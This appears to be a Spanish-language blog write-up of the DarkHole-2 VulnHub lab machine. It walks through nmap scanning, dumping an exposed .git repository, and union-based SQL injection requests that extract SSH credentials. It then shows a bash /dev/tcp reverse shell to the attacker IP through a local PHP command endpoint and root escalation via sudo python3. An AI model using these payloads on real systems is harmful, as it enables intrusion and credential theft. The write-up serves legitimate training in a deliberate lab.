@@ -1,0 +1,418 @@
+---
+layout: post
+titile: "Post 1"
+---
+
+# Dark Hole 2 - Write Up
+
+  - **Sitio Web:** Vulhub  
+  - **Nombre Máquina:** DarkHole-2 ([Enlace](https://www.vulnhub.com/entry/darkhole-2,740/))  
+  - **Creador:** Jihad Alqurashi  
+  - **Dificultad:** Hard  
+  - **Virtualización:** VMware  
+  - **Pista:** Don't waste your time For Brute-Force (*No pierdas el tiempo con Fuerza Bruta*)
+
+
+## 1. Escaneo de red
+
+Primero de todo entramos con privilegios administrador:
+```bash
+$ sudo su
+```
+
+> La contraseña en Kali es "kali"
+
+Comprobamos nuestra IP:
+
+```bash
+$ hostname -I
+
+192.168.184.128
+```
+
+Verificamos la IP de la máquina víctima:
+
+```bash
+$ arp-scan -I eth0 --localnet
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.184.131 00:0c:29:6e:ae:21       (Unknown)
+```
+Comprobamos si la máquina está corriendo en VMware:
+
+```bash
+$ macchanger -l | grep -i "VmWare"
+3086 - 00:0c:29 - VMware, Inc.
+```
+> El inicio de la MAC nos lo indica
+
+Verificamos la conexión con la máquina virtual vulnerable:
+
+```bash
+$ ping -c 1 192.168.184.131
+PING 192.168.184.131 (192.168.184.131) 56(84) bytes of data.
+64 bytes from 192.168.184.131: icmp_seq=1 ttl=64 time=1.58 ms
+```
+
+>Vemos que tenemos conexión. El TTL=64 por lo que se trata de una máquina Linux.
+
+### NMAP
+
+Escaneo de puertos:
+
+```bash
+$ nmap -p- --open -sS -vvv -n -Pn 192.168.184.131
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+MAC Address: 00:0C:29:6E:AE:21 (VMware)
+```
+
+Escaneo más específico con scripts de Nmap (NSE):
+
+```bash
+$ nmap -sC -sV -p22,80 192.168.184.131           
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)
+|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)
+|_  256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-git: 
+|   192.168.184.131:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: i changed login.php file for more secure 
+|_http-title: DarkHole V2
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+MAC Address: 00:0C:29:6E:AE:21 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+> El sistema operativo OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 se trata de un Ubuntu FOCAL.
+
+Vemos el NSE que nos indica un repositorio de git encontrado: `192.168.184.131:80/.git/`
+
+Información recopilada hasta el momento:
+* Nuestra IP: 192.168.184.128
+* IP Target: 192.168.184.131
+* MAC Addres: 00:0C:29:6E:AE:21 (VMware)
+* OS: Linux
+* Servidor web y conexión por SSH
+* Puertos, servicios y versiones:
+
+|Puerto|Estado|Servicio|Versió|
+|----|----|----|----|
+|22/tcp|open|ssh|`OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)`|
+|80/tcp|open|http|`Apache httpd 2.4.41 ((Ubuntu))`|
+
+## 2. Enumeración
+
+Comprobamos la web con el siguiente comando:
+
+```bash
+$ whatweb http://192.168.184.131
+http://192.168.184.131 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.184.131], Title[DarkHole V2]
+```
+
+Accedemos a la página web `http://192.168.184.131` y vemos un formulario de login en `http://192.168.184.131/login.php`. Probamos un ataque SQL Injection con BurpSuite, pero no es vulnerable.
+
+Probamos si podemos obtener acceso con ataques SQL injection usando BurpSuite pero vemos que no es vulnerable.
+
+Recuerdamos el path `.git` expuesto en la página, lo que indica que la carpeta Git del repositorio está pública. Utilizamos `git-dumper` para descargar el repositorio.
+
+```bash
+$ git clone https://github.com/arthaud/git-dumper.git
+$ cd git-dumper
+$ mkdir darkhole2git
+$ python3 git_dumper.py http://192.168.184.131/.git/ darkhole2git
+```
+
+Una vez descargado el repositorio, lo encontramos en la carpeta `darkhole2git`.
+
+```bash                                                                                                                                                
+┌──(root㉿kali)-[/home/kali/git-dumper/darkhole2git]
+└─# ls
+config  dashboard.php  index.php  js  login.php  logout.php  style
+```
+
+Usamos `git log` para ver el historial de commits:
+
+```bash
+┌──(root㉿kali)-[/home/kali/git-dumper/darkhole2git]
+└─# git log                                            
+commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -> master)
+Author: Jehad Alqurashi <anmar-v7@hotmail.com>
+Date:   Mon Aug 30 13:14:32 2021 +0300
+
+    i changed login.php file for more secure
+
+commit a4d900a8d85e8938d3601f3cef113ee293028e10
+Author: Jehad Alqurashi <anmar-v7@hotmail.com>
+Date:   Mon Aug 30 13:06:20 2021 +0300
+
+    I added login.php file with default credentials
+
+commit aa2a5f3aa15bb402f2b90a07d86af57436d64917
+Author: Jehad Alqurashi <anmar-v7@hotmail.com>
+Date:   Mon Aug 30 13:02:44 2021 +0300
+
+    First Initialize
+```
+
+Con el comando `git show <commit>` podemos acceder a más información del cambio realizado en .git.
+
+```bash
+┌──(root㉿kali)-[/home/kali/git-dumper/darkhole2git]
+└─# git show a4d900a8d85e8938d3601f3cef113ee293028e10
+commit a4d900a8d85e8938d3601f3cef113ee293028e10
+Author: Jehad Alqurashi <anmar-v7@hotmail.com>
+Date:   Mon Aug 30 13:06:20 2021 +0300
+
+    I added login.php file with default credentials
+
+...
++<?php
++session_start();
++require 'config/config.php';
++if($_SERVER['REQUEST_METHOD'] == 'POST'){
++    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
++        $_SESSION['userid'] = 1;
++        header("location:dashboard.php");
++        die();
++    }
+...
+```
+
+Encontramos que las credenciales por defecto para el login son:
+
+- Usuario: lush@admin.com
+- Contraseña: 321
+- Accedemos con éxito a `http://192.168.184.131/login`
+
+## 3. Explotación
+
+En la URL `http://192.168.184.131/dashboard.php?id=1`, probamos cambiar el parámetro `id=1` por `id=2` y vemos que la página responde. Esto sugiere que hay un punto de inyección SQL. Usamos BurpSuite para interceptar las peticiones y realizamos un ataque de SQL Injection con `ORDER BY`.
+
+Comenzamos con la siguiente inyección:
+
+```bash
+GET /dashboard.php?id=1'+order+by+6--+- HTTP/1.1
+```
+Los `+` entre medio es para realizar `urlencode`.
+
+Al ver que la consulta no responde para order by 7, inferimos que hay 6 columnas en la consulta SQL.
+
+### Union-Based SQL Injection
+
+1. Obtenemos la Base de Datos Actual:
+
+En `Union-Based SQL Injection` se debe conocer el número exacto de columnas para realizar una unión exitosa.
+
+```bash
+GET /dashboard.php?id=1' UNION SELECT NULL, NULL, NULL, database(), NULL, NULL-- -
+```
+
+>Recordamos que en BurpSuite lo hemos de meter con `+` en los espacios para la URL al hacer la petición. Seleccionmos y apretamos CTRL+U nos apareceran `+` entre medio.
+
+Obtenemos el Usuario Actual:
+
+```bash
+GET /dashboard.php?id=2'+UNION+SELECT+user(),+user(),+user(),+user(),+user(),+user()--+- HTTP/1.1
+```
+
+Obtenemos el usuario `root@localhost`
+
+3. Nombre de las columnas
+
+```bash
+GET /dashboard.php?id=2'+UNION+SELECT+1,schema_name,2,4,5,6+from+information_schema.schemata--+- HTTP/1.1
+```
+
+Solo nos devuelve `my_sql`.
+
+4. Obtenemos los Nombres de las Columnas:
+
+Vamos a concatenar los resultados y en el Pretty ver el nombre de las columnas:
+
+```bash
+GET /dashboard.php?id=2'+UNION+SELECT+1,group_concat(schema_name),2,4,5,6+from+information_schema.schemata--+- HTTP/1.1
+```
+
+Obtenemos:
+
+```bash
+value="mysql,information_schema,performance_schema,sys,darkhole_2"
+```
+
+5. Nombre de las tablas de la columna `darkhole_2`:
+
+```bash
+GET /dashboard.php?id=2'+UNION+SELECT+1,group_concat(table_name),2,4,5,6+from+information_schema.tables+where+table_schema='darkhole_2'--+- HTTP/1.1
+```
+
+Encontramos las columnas `SSH`, `users`.
+
+5. Obtenemos las Columnas de la Tabla ssh:
+
+```bash
+GET /dashboard.php?id=2'+UNION+SELECT+1,+2,+group_concat(column_name),+4,+5,+6+FROM+information_schema.columns+where+table_schema='darkhole_2'+and+table_name='ssh'--+- HTTP/1.1
+```
+
+La tabla ssh tiene las columnas `id`, `user` y `pass`, el siguiente paso sería extraer los valores almacenados en esa tabla.
+
+La tabla users (substituimos `ssh` por `users` y se obtiene las columnas `value="id,username,email,password,contact_number,address"`
+
+6. Obtenemos las Credenciales del Usuario
+
+```bash
+GET /dashboard.php?id=2'+UNION+SELECT+1,2,group_concat(id,':',user,':',pass),4,5,6+FROM+darkhole_2.ssh--+- HTTP/1.1
+
+1:jehad:fool
+```
+
+Encontramos el usuario `jehad` con el password `fool`.
+
+## 4. Escalar privilegios
+
+Nos conectamos por ssh a la máquina víctima
+
+```bash
+ssh jehad@192.168.184.131
+```
+Introducimos la credencial  `fool`.
+
+Comando útiles a usar:
+- El comando `ls -la` en sistemas basados en Unix (Linux, macOS, etc.) muestra una lista detallada de los archivos y directorios en el directorio actual, incluyendo los archivos ocultos.
+- El comando pwd significa print working directory ("imprimir directorio de trabajo") y se utiliza para mostrar la ruta absoluta del directorio en el que estás trabajando actualmente.
+- El comando `netstat -nat` se utiliza en sistemas Unix/Linux para mostrar información detallada sobre las conexiones de red activas y puertos en uso, filtrando específicamente las conexiones TCP.
+
+Vemos que el puerto `9999` está abierto.
+
+El comando `ps -faux` en sistemas Linux muestra una lista detallada de los procesos en ejecución, con información ampliada y organizada en un formato jerárquico para que sea fácil identificar qué procesos están relacionados entre sí. 
+
+Filtramos por el puerto 9999 `| grep 9999`:
+
+```bash
+/bin/sh -c  cd /opt/web && php -S localhost:9999
+```
+
+Está cambiando al directorio `/opt/web` e inicia un servidor web local con PHP escuchando en `localhost:9999` (El usuario losy).
+
+En la ubicación `/opt/web` encontramos un index.php con un código que responde como losy a solicitudes `cmd`.
+
+Probamos
+
+```bash
+$ curl "http://localhost:9999/execute.php?cmd=whoami"
+Parameter GET['cmd']losy
+```
+
+Al existir un puerto abierto localmente que no podemos acceder externamente.
+
+(Se podría usar la herramienta [chisel](https://github.com/jpillora/chisel)).
+
+Para ello, nos ponemos en escucha en el puerto 443:
+
+```bash
+$ nc -lvvp 443
+
+Comando explicado:
+-nc: Llama a la herramienta Netcat, conocida como la "navaja suiza" de las conexiones de red.
+-l: Escucha conexiones entrantes (modo listener).
+-v: Modo verbose (muestra información detallada sobre la conexión).
+-v (repetido): Aumenta el nivel de detalle de la salida.
+-p 443: Especifica el puerto en el que escuchar (en este caso, 443).
+```
+
+En la máquina víctima ejecutamos el siguiente comando:
+
+```bash
+$curl -G http://127.0.0.1:9999 --data-urlencode "cmd= bash -c 'bash -i >& /dev/tcp/192.168.184.128/443 0>&1'"
+```
+Código explicado:
+- `curl -G`: curl se usa para realizar solicitudes HTTP y la opción -G indica que se está enviando una solicitud HTTP GET
+- `http://127.0.0.1:9999` Este es el destino de la solicitud HTTP. En este caso, el servidor PHP en ejecución local en el puerto 9999.
+- `--data-urlencode` Este parámetro codifica la cadena después de cmd= para enviarla de forma segura como parte de la solicitud URL.
+
+El comando desde `bash` hasta el final intentará iniciar una shell interactiva inversa (reverse shell).
+- `bash -c:` Inicia una nueva instancia de Bash para ejecutar el comando proporcionado.
+- `bash -i >& /dev/tcp/192.168.184.128/443 0>&1:` Abre una conexión TCP desde el servidor víctima a la dirección IP `192.168.184.128` (Máquina atacante) en el puerto 443. Redirige el flujo estándar de entrada y salida hacia la conexión, proporcionando al atacante acceso remoto a una shell en la máquina víctima.
+
+En resumen:
+ - 1. PHP permite ejecutar comandos arbitrarios a través del parámetro cmd.
+ - 2. El comando enviado en la solicitud HTTP abre una conexión hacia el atacante (en la IP 192.168.184.128, puerto 443).
+ - 3. En la máquina atacante, un comando como nc -lvvp 443 está esperando conexiones entrantes.
+
+```bash
+losy@darkhole:/opt/web$ whoami
+whoami
+losy
+```
+
+El comando `cat ~/.bash_history` mostrará el historial de comandos ejecutados por el usuario actual en la terminal Bash. Esto puede ser útil para revisar comandos pasados, pero también representa un riesgo de seguridad si contiene información sensible.
+
+En los comandos ejectutados encontramos lo siguiente `P0assw0rd losy:gang`.
+
+Nos conectamos por ssh al usuario losy
+
+```bash
+losy@darkhole:~$ sudo -l
+[sudo] password for losy: 
+Matching Defaults entries for losy on darkhole:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User losy may run the following commands on darkhole:
+    (root) /usr/bin/python3
+```
+
+"El usuario losy puede ejecutar los siguientes comandos en darkhole: (root) /usr/bin/python3". Por tanto:
+
+```bash
+sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Desglose del comando:
+- `sudo:` Ejecuta el comando con privilegios de administrador, lo que es útil si necesitas acceso de root para invocar una shell o si la shell limitada lo permite.
+- `python3 -c:` Ejecuta código Python directamente desde la línea de comandos.
+- `import pty:` Importa el módulo pty, que proporciona herramientas para manejar pseudo-terminales en sistemas Unix.
+- `pty.spawn("/bin/bash"):` Llama a la función pty.spawn para iniciar un programa interactivo (/bin/bash) conectado al pseudo-terminal.
+
+En resumen: Esto convierte una shell limitada o no interactiva en una shell funcional que puede manejar características como el uso de Ctrl+C, tabulación para autocompletar, etc.
+
+En resumen:
+
+El usuario losy verifica sus permisos con sudo -l, confirmando que puede ejecutar el comando /usr/bin/python3 como root sin restricciones. Esto significa que tiene permiso para usar Python con privilegios de administrador.
+
+Aprovechamos este permiso para ejecutar un script Python que utiliza el módulo pty para crear una shell interactiva (/bin/bash). Al hacerlo, obtenemos acceso a una shell con privilegios de root, escalando sus permisos al nivel más alto del sistema. 
+
+Esto demuestra cómo un permiso mal configurado (como acceso a Python) puede ser explotado para obtener control total del sistema.
+
+## Root Flag:
+```bash
+root@darkhole:/home/losy# ls
+user.txt
+root@darkhole:/home/losy# cat user.txt 
+DarkHole{'This_is_the_life_man_better_than_a_cruise'}
+
+root@darkhole:/home/losy# 
+```
+
+```bash
+root@darkhole:/home/losy# cd /root/
+root@darkhole:~# ls
+root.txt  snap
+root@darkhole:~# cat root.txt 
+DarkHole{'Legend'}
+root@darkhole:~# 
+```
+
+
+
